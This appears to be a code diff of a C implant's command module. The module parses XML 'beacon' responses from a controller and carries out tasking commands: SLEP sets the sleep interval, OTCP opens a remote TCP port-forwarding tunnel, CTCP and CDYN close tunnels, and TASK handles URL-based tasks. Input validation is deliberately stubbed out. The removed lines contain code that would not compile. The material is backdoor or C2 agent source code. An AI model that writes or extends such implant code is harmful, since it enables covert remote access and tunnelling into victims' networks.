@@ -4,77 +4,45 @@
 #include <unistd.h>
 #include <libgen.h>
 #include <errno.h>
+#include <sys/types.h>
 
 #include "command.h"
 #include "beacon.h"
 #include "colors.h"
+#include "ssh.h"
 
 #define MAX_ATTR_LEN 128
-
-static void handle_sigchld(int sig)
-{
-	int saved_errno = errno;
-	while (waitpid(-1, 0, WNOHANG) > 0) /* Possibly save exit status */
-		;
-	errno = saved_errno;
-}
-
-#define SUCC 0
-#define FAIL (-1)
-
-static int do_remote_tunnel(int lport, int rport)
-{
-	switch (fork()) {
-	case -1: /* Error */
-		printf("[*] Fork\n");
-		return FAIL;
-
-	case : /* PARENT */
-		printf("[*] Started remote port forwarding (R)%s > (L)%s\n",
-		       rport, lport);
-		return SUCC;
-
-	default: /* CHILD, does the actual work */
-		int ret = remote_forwarding(lport, rport);
-		_exit(ret);
-	}
-}
 
 static int validate_param(const char *cmd, const char *param)
 {
 	return 1;
 }
 
-static int do_command(char *cmd, char *param)
-{
-	struct sigaction sa;
-	sa.sa_handler = &handle_sigchld;
-	sigemptyset(&sa.sa_mask);
-	sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
-	if (sigaction(SIGCHL, &sa, 0) == -1) {
-		printf("[*] sigaction\n");
-		return -1;
-	}
+#define SUCC 1
+#define FAIL (-1)
 
+static int exec_command(char *cmd, char *param)
+{
 	int ret = 0;
+
 	if (strcmp(cmd, "SLEP") == 0) {
 		/* Update timeout value */
-		timeout = (int) strtol(param, NULL, 10);
-		printf(GREEN("[SLEP] Timeout set to %d seconds\n"), timeout);
-		return SUCC;
+		// if (is_valid_interval(param))
+		timeout = (int)strtol(param, NULL, 10);
+		printf(GREEN("[*] Timeout set to %d seconds\n"), timeout);
+		ret = SUCC;
 	} else if (strcmp(cmd, "OTCP") == 0) {
 		/* remote port forwarding: L22C900 */
-		// sanity checks on param
-		// if (validate_param(cmd, param))
+		// if (is_valid_port_spec(param))
 		int lport, rport;
-		sscanf(param, "L%dC%d", lport_str, rport_str);
-		ret = do_remote_tunnel(lport, rport);
+		sscanf(param, "L%dC%d", &lport, &rport);
+		printf("[*] Calling do_remote_tunnel(%d, %d)\n", lport, rport);
+		ret = remote_forwarding(lport, rport);
 		if (ret == SUCC) {
-			printf(GREEN("[OTCP] Opened TCP tunnel on port %s\n"),
+			printf(GREEN("[*] Opened TCP tunnel on port %d\n"),
 			       lport);
-		}
-		else {
-			printf(RED("[OTCP] Failed to open TCP tunnel\n"));
+		} else {
+			printf(RED("[*] Failed to open TCP tunnel\n"));
 		}
 	} else if (strcmp(cmd, "CTCP") == 0) {
 		printf(GREEN("[CTCP] TCP tunnel closed\n"));
@@ -92,6 +60,7 @@ static int do_command(char *cmd, char *param)
 		printf(GREEN("[CDYN] Dynamic closed\n"));
 		return FAIL;
 	} else if (strcmp(cmd, "TASK") == 0) {
+		// if (is_valid_url(param))
 		char *cmd_str = malloc(256);
 		if (cmd_str == NULL)
 			return FAIL;
@@ -154,10 +123,12 @@ static char *xml_parse_command(const char *xml, struct command *cmd)
 	cmd->type = type;
 	cmd->param = param;
 
+	/* Return next index to enusure the next call
+	   looks past the current command */
 	return (pos + 1);
 }
 
-int get_commands(char *response, struct command **cmds)
+static int xml_parse_response(char *response, struct command **cmds)
 {
 	*cmds = NULL;
 	int cmd_num = 0;
@@ -172,6 +143,8 @@ int get_commands(char *response, struct command **cmds)
 
 		char *pos = cmds_section;
 		struct command *last;
+
+		// replace with recursive function?
 		while (1) {
 			struct command *cmd = calloc(1, sizeof(struct command));
 
@@ -197,11 +170,14 @@ int get_commands(char *response, struct command **cmds)
 	return cmd_num;
 }
 
-void exec_commands(char *beacon_response)
+void parse_and_exec(char *beacon_response)
 {
+	if (!beacon_response)
+		return;
+
 	struct command *cmds;
 	printf("[*] Parsing beacon response...\n");
-	int cmd_num = get_commands(beacon_response, &cmds);
+	int cmd_num = xml_parse_response(beacon_response, &cmds);
 	if (!cmd_num) {
 		printf("[*] No commands found\n");
 		return;
@@ -212,11 +188,14 @@ void exec_commands(char *beacon_response)
 	int i, ret;
 	struct command *curr_cmd = cmds;
 	for (i = 0; i < cmd_num; i++) {
-		printf("[*] Executing command #%d...\n", (i + 1));
-		curr_cmd->ret = do_command(curr_cmd->type, curr_cmd->param);
-		printf("[*] Command status: %s\n",
+		printf("[*] Starting execution of command [%d]\n",
+		       curr_cmd->id);
+		curr_cmd->ret = exec_command(curr_cmd->type, curr_cmd->param);
+		printf("[*] Command [%d] status: %s\n", curr_cmd->id,
 		       (curr_cmd->ret == SUCC) ? GREEN("V") : RED("X"));
 		curr_cmd = curr_cmd->next;
+
+		// do something with the ret value...
 	}
 
 	/* Remember to free all command-related buffers */
